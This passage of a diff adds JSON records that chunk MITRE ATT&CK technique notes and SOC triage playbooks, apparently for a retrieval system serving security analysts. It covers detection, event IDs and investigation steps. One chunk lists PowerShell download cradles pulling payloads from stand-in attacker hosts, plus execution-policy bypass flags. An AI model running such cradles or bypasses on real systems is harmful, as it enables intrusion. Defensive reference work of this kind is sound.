+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Wazuh Relevance\nWazuh can collect Windows Event 4698 and monitor the command line execution of `schtasks.exe`. Its ruleset includes specific detections for scheduled tasks running suspicious scripting engines.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-18",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Suricata Relevance\nSuricata might detect the network traffic resulting from the scheduled task's execution (e.g., a periodic beacon to a C2 server), but not the creation of the task itself.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-19",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Investigation Guidance\nReview the scheduled task configuration (XML file or `crontab` entry) to identify the payload being executed. Trace the parent process that created the task to determine the root cause of the compromise. Delete the malicious task and investigate any network connections made by the payload.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "phishing_t1566.md",
+    "chunk_id": "mitre-phishing_t1566-chunk-0",
+    "title": "Phishing: Spearphishing Attachment & Link",
+    "text": "# Phishing: Spearphishing Attachment & Link\n\n**Technique ID:** T1566  \n**Sub-techniques:** T1566.001 (Spearphishing Attachment), T1566.002 (Spearphishing Link)  \n**Tactic:** Initial Access",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1566",
+      "T1566.001",
+      "T1566.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "phishing_t1566.md",
+    "chunk_id": "mitre-phishing_t1566-chunk-1",
+    "title": "Phishing: Spearphishing Attachment & Link",
+    "text": "## Overview\n\nAdversaries use spearphishing emails with malicious attachments (e.g. ISO, ZIP, Office documents with macros, PDF) or weaponized links to gain initial access to target endpoints.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1566",
+      "T1566.001",
+      "T1566.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "phishing_t1566.md",
+    "chunk_id": "mitre-phishing_t1566-chunk-2",
+    "title": "Phishing: Spearphishing Attachment & Link",
+    "text": "## Execution Mechanics\n\n1. **Malicious Attachments:** An victim opens an attachment containing VBA macros, executable payloads inside ZIP/RAR archives, or LNK shortcut files.\n2. **Child Process Spawning:** Opening the document causes `winword.exe` or `excel.exe` to spawn `powershell.exe`, `cmd.exe`, or `wscript.exe`.\n3. **Payload Downloading:** Initial loader script retrieves secondary stage payloads from external C2 domains or compromised cloud services.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1566",
+      "T1566.001",
+      "T1566.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "phishing_t1566.md",
+    "chunk_id": "mitre-phishing_t1566-chunk-3",
+    "title": "Phishing: Spearphishing Attachment & Link",
+    "text": "## Key Indicators\n\n- Word or Excel spawning command interpreters (`powershell.exe`, `cmd.exe`, `mshta.exe`).\n- Email attachments with double extensions (e.g., `invoice.pdf.exe`).\n- Rapid network connections to recently registered external IP addresses following email delivery.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1566",
+      "T1566.001",
+      "T1566.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-0",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "# Command and Scripting Interpreter: PowerShell\n\n**Technique ID:** T1059.001  \n**Tactic:** Execution  \n**Parent Technique:** T1059 - Command and Scripting Interpreter",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-1",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "## Overview\n\nAdversaries may abuse PowerShell for execution. PowerShell is a powerful interactive command-line interface and scripting environment built into Microsoft Windows. It provides full access to .NET framework, Windows Management Instrumentation (WMI), and Win32 APIs, making it an ideal tool for administrative tasks as well as malicious activity.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-2",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "## Common Adversary Tactics & Sub-techniques\n\nAdversaries use PowerShell to execute commands, download payload cradles, bypass execution policies, and run in-memory scripts to evade disk-based detection.\n\n### Encoded Command Execution (`-EncodedCommand`)",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-3",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "Attackers frequently encode PowerShell commands using Base64 via the `-EncodedCommand`, `-Enc`, or `-e` command-line flags.\n- **Purpose:** Obfuscate malicious scripts, bypass string-matching firewall/IDS rules, and prevent casual command-line inspection.\n- **Example Payload Structure:** `powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgA...`\n\n### Download Cradles",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-4",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "PowerShell scripts often fetch secondary payloads from remote C2 servers or CDN infrastructure:\n- `Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile payload.ps1`\n- `(New-Object System.Net.WebClient).DownloadString('http://c2.example.com/stage2.ps1')`\n- `Start-BitsTransfer -Source http://attacker.com/loader.exe`\n\n### Execution Policy Bypass\n\nThe default Windows PowerShell execution policy restricts running unsigned scripts. Adversaries bypass this using flags:\n- `-ExecutionPolicy Bypass` or `-EP Bypass`\n- `-Scope Process`",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-5",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "## Detection & Indicators of Compromise (IOCs)\n\n1. `powershell.exe` spawned by non-standard parent processes such as Microsoft Office (`winword.exe`, `excel.exe`), Web Servers (`w3wp.exe`), or SQL Server (`sqlservr.exe`).\n2. Suspicious command-line flags: `-WindowStyle Hidden`, `-W Hidden`, `-NoProfile`, `-NonInteractive`, `-EncodedCommand`.\n3. Outbound network connections originated directly by `powershell.exe` to external IP addresses.\n4. Windows Script Block Logging (Event ID 4104) and Module Logging (Event ID 4103) capturing de-obfuscated script content.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "powershell_t1059_001.md",
+    "chunk_id": "mitre-powershell_t1059_001-chunk-6",
+    "title": "Command and Scripting Interpreter: PowerShell",
+    "text": "## Investigation & Mitigation\n\n- **Decode Payload:** Always decode Base64 arguments captured in process creation logs (Event ID 4688 / Sysmon Event ID 1).\n- **Inspect Parent Process:** Track process lineage to determine initial execution vector.\n- **Constrained Language Mode:** Enforce PowerShell Constrained Language Mode (CLM) alongside AppLocker or WDAC.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-0",
+    "title": "Create or Modify System Process",
+    "text": "# Create or Modify System Process\n\n**Technique ID:** T1543\n**Tactic:** Persistence, Privilege Escalation",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-1",
+    "title": "Create or Modify System Process",
+    "text": "## Description\nAdversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. This includes creating or modifying Windows Services, Linux systemd services, or macOS launch daemons.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-2",
+    "title": "Create or Modify System Process",
+    "text": "## Attacker Behavior\nAttackers use tools like `sc.exe` to install a new Windows service that executes a malicious binary under the `NT AUTHORITY\\SYSTEM` account. Alternatively, they might modify the binary path of an existing, benign service (Service Execution Hijacking) to point to malware.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-3",
+    "title": "Create or Modify System Process",
+    "text": "## SOC Evidence\n- Execution of `sc.exe create` or `sc.exe config`.\n- Windows Security Event ID 4697 (A service was installed in the system) or Event ID 7045 (Service Creation).\n- Creation of new `.service` files in `/etc/systemd/system/`.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-4",
+    "title": "Create or Modify System Process",
+    "text": "## Detection Clues\nMonitor for the creation of services launching binaries from temporary, public, or user profile directories. Pay attention to services created with suspicious names, typosquatted names, or those executing command interpreters.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-5",
+    "title": "Create or Modify System Process",
+    "text": "## Related Techniques\n- T1574: Hijack Execution Flow\n- T1569: System Services",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-6",
+    "title": "Create or Modify System Process",
+    "text": "## Example Alert Context\nA Sysmon Event ID 1 alert shows `sc.exe` being executed to modify the `binPath` of the \"Spooler\" service to execute `C:\\Windows\\Temp\\malware.exe`.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-7",
+    "title": "Create or Modify System Process",
+    "text": "## Wazuh Relevance\nWazuh natively parses Windows Event logs (like 4697 and 7045) and can trigger alerts when new services are installed. FIM can also detect the creation of Linux systemd unit files.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-8",
+    "title": "Create or Modify System Process",
+    "text": "## Suricata Relevance\nSuricata will not detect the modification of a system process directly. It can only detect subsequent network activity generated by the newly established service.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-9",
+    "title": "Create or Modify System Process",
+    "text": "## Investigation Guidance\nIdentify the exact binary path executed by the new or modified service. Revert any modifications to legitimate services to their original state. Check for lateral movement tools (like PsExec) which inherently create temporary Windows services during execution.\n\n---",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-10",
+    "title": "Create or Modify System Process",
+    "text": "# Abuse Elevation Control Mechanism\n\n**Technique ID:** T1548\n**Tactic:** Privilege Escalation, Defense Evasion",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-11",
+    "title": "Create or Modify System Process",
+    "text": "## Description\nAdversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. This includes bypassing User Account Control (UAC) on Windows or exploiting `sudo` misconfigurations on Linux.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-12",
+    "title": "Create or Modify System Process",
+    "text": "## Attacker Behavior\nAttackers execute specialized payloads that exploit UAC bypass techniques (such as COM handler hijacking or mock trusted directories) to launch elevated processes without prompting the user. On Linux, they might exploit wildly permissive `sudoers` configurations.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-13",
+    "title": "Create or Modify System Process",
+    "text": "## SOC Evidence\n- Process creation events showing a high-integrity process spawning from a medium-integrity process without a valid UAC prompt (Event ID 4624 Logon Type 9).\n- Use of known UAC bypass tools like UACMe.\n- Changes to registry keys associated with COM handlers (e.g., `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command`).",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-14",
+    "title": "Create or Modify System Process",
+    "text": "## Detection Clues\nMonitor for unusual registry modifications under `HKCU\\Software\\Classes`. Look for unexpected instances of `dllhost.exe`, `sdclt.exe`, or `eventvwr.exe` spawning command prompts or PowerShell.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-15",
+    "title": "Create or Modify System Process",
+    "text": "## Related Techniques\n- T1055: Process Injection\n- T1078: Valid Accounts",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-16",
+    "title": "Create or Modify System Process",
+    "text": "## Example Alert Context\nA Wazuh alert detects `eventvwr.exe` launching `cmd.exe` running as Administrator, a classic UAC bypass indicator.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-17",
+    "title": "Create or Modify System Process",
+    "text": "## Wazuh Relevance\nWazuh monitors process lineage and registry modifications. Rules can identify known UAC bypass techniques by correlating the execution of specific Windows binaries with sudden integrity level changes.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-18",
+    "title": "Create or Modify System Process",
+    "text": "## Suricata Relevance\nSuricata cannot detect local privilege escalation or UAC bypasses directly.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "privilege_escalation_t1543_t1548.md",
+    "chunk_id": "mitre-privilege_escalation_t1543_t1548-chunk-19",
+    "title": "Create or Modify System Process",
+    "text": "## Investigation Guidance\nInvestigate the initial vector that delivered the UAC bypass payload. Assess what actions the attacker performed once they gained SYSTEM or elevated Administrator privileges. Ensure systems are patched and UAC is configured to \"Always Notify\".",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1543",
+      "T1574",
+      "T1569",
+      "T1548",
+      "T1055",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-0",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "# MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-1",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Technique Overview\n\n**Technique ID:** T1059.001\n**Tactic:** Execution\n**Sub-technique of:** T1059 \u2014 Command and Scripting Interpreter\n\nAdversaries use PowerShell commands and scripts for execution. PowerShell is a powerful\ninteractive command-line interface and scripting environment included in the Windows\noperating system.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-2",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Encoded Commands\n\nAttackers frequently use the `-EncodedCommand` (or `-enc`) parameter to pass Base64-encoded\nPowerShell scripts. This technique is used to:\n\n- Bypass command-line logging that only captures plaintext arguments\n- Evade simple string-matching detection rules\n- Obfuscate malicious intent from casual inspection",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-3",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Common Indicators\n\n- `powershell.exe` launched with `-EncodedCommand`, `-enc`, or `-e` flags\n- `powershell.exe` launched with `-WindowStyle Hidden` or `-W Hidden`\n- `powershell.exe` spawned by unusual parent processes (e.g., `winword.exe`, `excel.exe`)\n- PowerShell downloading content via `Invoke-WebRequest`, `Net.WebClient`, or `Start-BitsTransfer`\n- Execution policy bypass with `-ExecutionPolicy Bypass`\n- PowerShell connecting to external IP addresses or uncommon domains",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-4",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Kill Chain Mapping\n\n- **Delivery:** Encoded command may arrive via phishing attachment or exploit\n- **Exploitation:** Script execution leverages PowerShell engine\n- **Execution:** The primary kill-chain stage \u2014 the encoded command runs on the host\n- **Command & Control:** PowerShell may establish outbound connections to C2 servers\n- **Actions on Objectives:** Data exfiltration, lateral movement, or persistence",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-5",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Risk Assessment\n\nEncoded PowerShell execution is considered **high risk** because:\n\n- It is one of the most common initial access and execution techniques\n- Encoding hides the true payload from basic inspection\n- PowerShell has deep access to Windows APIs and .NET framework\n- Legitimate administrative use makes pure blocking impractical",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "mitre_powershell.md",
+    "chunk_id": "mitre-mitre_powershell-chunk-6",
+    "title": "MITRE ATT&CK \u2014 PowerShell Execution (T1059.001)",
+    "text": "## Investigation Recommendations\n\n1. Decode the Base64 encoded command to inspect the actual payload\n2. Check the parent process that spawned PowerShell\n3. Review command-line arguments for download cradles or suspicious patterns\n4. Correlate with network logs for outbound connections during execution\n5. Check for persistence mechanisms created around the same timestamp\n6. Review Windows Event Log IDs 4103, 4104 (script block logging) and 4688 (process creation)",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.001",
+      "T1059.001",
+      "T1059"
+    ]
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "incident_response_playbook.md",
+    "chunk_id": "security-incident_response_playbook-chunk-0",
+    "title": "Defensive Incident Response & SOC Investigation Playbook",
+    "text": "# Defensive Incident Response & SOC Investigation Playbook",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "incident_response_playbook.md",
+    "chunk_id": "security-incident_response_playbook-chunk-1",
+    "title": "Defensive Incident Response & SOC Investigation Playbook",
+    "text": "## Investigation Methodology\n\nWhen analyzing security alerts, SOC analysts follow a structured triage methodology:\n\n### 1. Alert Verification & Context Gathering\n- Determine alert source (Wazuh HIDS, Suricata NIDS, Sysmon).\n- Identify key attributes: Hostname, Username, Source IP, Destination IP, Rule ID, Severity.\n- Verify whether the alert represents genuine malicious activity or a known administrative false positive.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "incident_response_playbook.md",
+    "chunk_id": "security-incident_response_playbook-chunk-2",
+    "title": "Defensive Incident Response & SOC Investigation Playbook",
+    "text": "### 2. Evidence Correlation & Artifact Analysis\n- **Process Lineage:** Inspect Parent Process ID (PPID) and Child Process ID (PID).\n- **Command Line Parsing:** Obfuscated, encoded, or long command arguments.\n- **Network Telemetry:** Correlate host event timestamp with network flow logs.\n- **User Activity:** Check if the user account exhibited recent anomalous logons or password resets.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "incident_response_playbook.md",
+    "chunk_id": "security-incident_response_playbook-chunk-3",
+    "title": "Defensive Incident Response & SOC Investigation Playbook",
+    "text": "### 3. Cyber Kill Chain Mapping\nMap observed artifacts to the Cyber Kill Chain stage:\n- *Reconnaissance / Initial Access:* Phishing, scanning, exploit attempt.\n- *Execution:* PowerShell execution, script launching, binary execution.\n- *Persistence:* Scheduled tasks, registry run keys, new service creation.\n- *Privilege Escalation / Defense Evasion:* LSASS access, obfuscation, clearing event logs.\n- *Command & Control:* Outbound beaconing, remote access trojans.\n- *Actions on Objectives:* Data staging, exfiltration, ransomware encryption.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "incident_response_playbook.md",
+    "chunk_id": "security-incident_response_playbook-chunk-4",
+    "title": "Defensive Incident Response & SOC Investigation Playbook",
+    "text": "## Defensive Recommendations & Remediation\n\n- **Host Containment:** Isolate compromised host from network if active C2 or ransomware is detected.\n- **Credential Revocation:** Reset compromised account passwords and revoke active Kerberos/OAuth tokens.\n- **Telemetry Enhancement:** Enable Script Block Logging (Event ID 4104) and Process Creation Auditing (Event ID 4688).\n- **IOC Hunting:** Sweep enterprise endpoints for identical file hashes, registry keys, or IP connections.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_alert_triage.md",
+    "chunk_id": "security-soc_alert_triage-chunk-0",
+    "title": "SOC Alert Triage and Incident Response",
+    "text": "# SOC Alert Triage and Incident Response",
+    "topic": "Lateral Movement",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_alert_triage.md",
+    "chunk_id": "security-soc_alert_triage-chunk-1",
+    "title": "SOC Alert Triage and Incident Response",
+    "text": "## Description\nAlert triage is the process of reviewing incoming security alerts, determining their validity (true positive vs. false positive), assessing their severity, and deciding on the appropriate incident response workflow.",
+    "topic": "Lateral Movement",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_alert_triage.md",
+    "chunk_id": "security-soc_alert_triage-chunk-2",
+    "title": "SOC Alert Triage and Incident Response",
+    "text": "## SOC Application\n1. **Triage:** Analysts review the alert context (Source IP, User, Process, Command Line). They look for historical context and known benign administrative behaviors.\n2. **Containment:** If an alert is a true positive (e.g., confirmed ransomware or active C2), the host is immediately isolated from the network to prevent lateral movement.\n3. **Eradication:** Removing the malicious artifacts (malware, persistence mechanisms, compromised accounts).\n4. **Recovery:** Restoring systems from backups, patching vulnerabilities, and returning the host to production.",
+    "topic": "Lateral Movement",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
